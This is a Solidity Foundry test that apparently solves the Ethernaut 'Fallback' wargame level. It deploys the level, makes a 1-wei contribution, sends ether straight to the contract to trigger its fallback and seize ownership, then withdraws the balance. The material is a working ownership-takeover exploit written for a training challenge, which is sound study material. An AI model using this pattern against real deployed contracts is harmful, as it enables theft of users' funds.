// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Fallback.sol";
import "../src/Ethernaut.sol";
import "../src/FallbackFactory.sol";
import "forge-std/Test.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    FallbackFactory level;
    Fallback instance;
    address player = address(123);
    address instanceAddress;

    function setUp() external {
        startHoax(msg.sender);
        ethernaut = new Ethernaut();
        level = new FallbackFactory();
        ethernaut.registerLevel(level);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Fallback(payable(instanceAddress));
    }

    function testFallbackHack() public {
        console.log("owner1: ", instance.owner(), msg.sender);
        instance.contribute{value: 1 wei}();
        (bool success, ) = payable(instanceAddress).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(instance.owner(), msg.sender);
        console.log("owner2: ", instance.owner(), msg.sender, player);
        console.log("contribute: ", instance.getContribution());
        instance.withdraw();
        console.log("contribute2: ", instance.getContribution());
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
